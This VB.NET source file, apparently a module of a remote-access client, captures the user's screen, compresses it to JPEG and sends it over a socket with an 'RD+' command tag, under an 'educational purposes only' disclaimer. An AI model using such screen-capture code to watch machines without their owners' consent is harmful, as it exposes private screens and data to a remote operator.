Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.Windows.Forms

'       │ Author     : NYAN CAT
'       │ Name       : Simple remote desktop. "capture,resize,compress"

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program Is distributed for educational purposes only.

Public Class RemoteDesktop

    Public Shared Sub Capture(ByVal W As Integer, ByVal H As Integer)

        Dim ScreenSize As Size = New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
        Dim screenGrab As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
        Dim g As Graphics = Graphics.FromImage(screenGrab)
        g.CopyFromScreen(New Point(0, 0), New Point(0, 0), ScreenSize)

        Dim Temp As New Bitmap(W, H)
        Dim G2 As Graphics = Graphics.FromImage(Temp)
        G2.DrawImage(screenGrab, New Rectangle(0, 0, W, H), New Drawing.Rectangle(0, 0, ScreenSize.Width, ScreenSize.Height), GraphicsUnit.Pixel)

        Dim encoderParameter As EncoderParameter = New EncoderParameter(Encoder.Quality, 40)
        Dim encoderInfo As ImageCodecInfo = GetEncoderInfo(ImageFormat.Jpeg)
        Dim encoderParameters As EncoderParameters = New EncoderParameters(1)
        encoderParameters.Param(0) = encoderParameter

        Dim MS As New IO.MemoryStream
        Temp.Save(MS, encoderInfo, encoderParameters)

        ClientSocket.Send("RD+" + ClientSocket.SPL + BS(MS.ToArray))

        Try
            g.Dispose()
            G2.Dispose()
            screenGrab.Dispose()
        Catch ex As Exception
        End Try


        Try
            MS.Dispose()
        Catch ex As Exception
        End Try

    End Sub



    Private Shared Function GetEncoderInfo(ByVal format As ImageFormat) As ImageCodecInfo
        Dim j As Integer
        Dim encoders() As ImageCodecInfo
        encoders = ImageCodecInfo.GetImageEncoders()

        j = 0
        While j < encoders.Length
            If encoders(j).FormatID = format.Guid Then
                Return encoders(j)
            End If
            j += 1
        End While
        Return Nothing

    End Function
End Class
